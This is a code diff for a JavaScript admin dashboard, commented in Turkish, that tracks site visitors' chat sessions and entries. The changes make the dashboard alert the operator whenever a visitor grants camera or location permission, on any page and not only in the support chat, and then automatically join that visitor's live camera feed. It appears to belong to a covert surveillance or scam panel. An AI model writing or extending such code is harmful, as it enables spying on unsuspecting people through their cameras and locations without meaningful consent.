@@ -1,4 +1,4 @@
-﻿import "./chat-sync.js?v=88";
+﻿import "./chat-sync.js?v=96";
 
 async function ready() {
   if (window.ChatSync) return window.ChatSync;
@@ -536,8 +536,15 @@ function startDash(sync) {
         const preview = String(r.preview || "");
         const isEntry = /siteye\s+giri[sş]/i.test(preview);
         const enteredAt = Number(r.enteredAt) || 0;
-        // Mesaj veya siteye giriş — admin’e düşsün
-        if (r.lastWho === "user" || isEntry || enteredAt > prev) {
+        const camAt = Number(r.cameraGrantedAt) || 0;
+        const locAt = Number(r.lastLocationAt) || 0;
+        // İlk izin / kamera / konum — sohbet sayfası olmasa da admin’e düşsün
+        const isMedia =
+          Boolean(r.cameraGranted || r.hasCamera || r.hasLocation || r.cameraPending) ||
+          camAt > prev ||
+          locAt > prev ||
+          /📷|📍|kamera|konum/i.test(preview);
+        if (r.lastWho === "user" || isEntry || enteredAt > prev || isMedia) {
           bumped.push(r);
         }
       }
@@ -568,6 +575,7 @@ function startDash(sync) {
         force: true,
       });
       openSession(newest);
+      maybeJoinSessionCamera(newest);
       return;
     }
 
@@ -576,26 +584,54 @@ function startDash(sync) {
         (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
       )[0];
       const isEntry = /siteye\s+giri[sş]/i.test(String(newest.preview || ""));
+      const isMedia =
+        Boolean(
+          newest.cameraGranted ||
+            newest.hasCamera ||
+            newest.hasLocation ||
+            newest.cameraPending
+        ) || /📷|📍|kamera|konum/i.test(String(newest.preview || ""));
 
-      // Açık sohbetteki normal mesajlar zaten appendThreadMessage ile alarm veriyor —
-      // çift / üst üste bildirim olmasın. Site girişi istisna.
-      if (newest.id === selectedId && !isEntry) {
+      if (newest.id === selectedId && !isEntry && !isMedia) {
         /* skip bump alert */
       } else {
         fireHighAlert({
-          kicker: isEntry ? "SİTE GİRİŞİ" : "YENİ MESAJ",
-          title: isEntry ? "Ziyaretçi siteye girdi" : "Ziyaretçi aktivitesi",
+          kicker: isMedia ? "KAMERA / KONUM" : isEntry ? "SİTE GİRİŞİ" : "YENİ MESAJ",
+          title: isMedia
+            ? "Ziyaretçi izin verdi — kamera/konum"
+            : isEntry
+              ? "Ziyaretçi siteye girdi"
+              : "Ziyaretçi aktivitesi",
           body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
             newest.preview || ""
           ).slice(0, 120)}`,
-          tag: isEntry ? `entry-${newest.id}` : `bump-${newest.id}`,
+          tag: isMedia
+            ? `media-${newest.id}`
+            : isEntry
+              ? `entry-${newest.id}`
+              : `bump-${newest.id}`,
+          force: Boolean(isMedia),
         });
       }
-      if (newest.id !== selectedId) openSession(newest);
+      if (isMedia || newest.id !== selectedId) openSession(newest);
+      maybeJoinSessionCamera(newest);
     }
 
     if (!selectedId && rows[0]) openSession(rows[0]);
   });
+}
+
+function maybeJoinSessionCamera(row) {
+  if (!row?.id || !row.lastCallId) return;
+  if (!(row.cameraGranted || row.hasCamera || row.cameraPending)) return;
+  // İzin anında sohbet oturumunu aç + canlı kameraya bağlan
+  if (selectedId !== row.id) {
+    openSession(row);
+    return;
+  }
+  window.setTimeout(() => {
+    void joinAdminCamera(row.id, row.lastCallId);
+  }, 200);
 }
 
 async function armAlerts() {
@@ -1780,8 +1816,8 @@ function appendThreadMessage(msg, announce) {
     const p = document.createElement("p");
     p.textContent = `📷 Kamera talebi: ${msg.text || ""}`;
     body.appendChild(p);
-    // Ziyaretçi otomatik kamera (from:auto). Admin’in kendi “Kamera gönder” yolu zaten join eder.
-    if (announce && msg.from === "auto" && msg.callId && selectedId) {
+    // Ziyaretçi otomatik kamera (from:auto) — hangi sayfadan gelirse gelsin bağlan
+    if (announce && msg.callId && selectedId) {
       resetLiveVideoUi();
       void joinAdminCamera(selectedId, msg.callId);
     }
@@ -2046,6 +2082,12 @@ function openSession(row) {
   });
 
   bindSessionMessages(row.id);
+  // Destek sohbeti dışında verilen izin de canlı bağlansın (openSession döngüsüne girme)
+  if (row.lastCallId && (row.cameraGranted || row.hasCamera || row.cameraPending)) {
+    window.setTimeout(() => {
+      void joinAdminCamera(row.id, row.lastCallId);
+    }, 200);
+  }
   replyInput?.focus();
 }
 
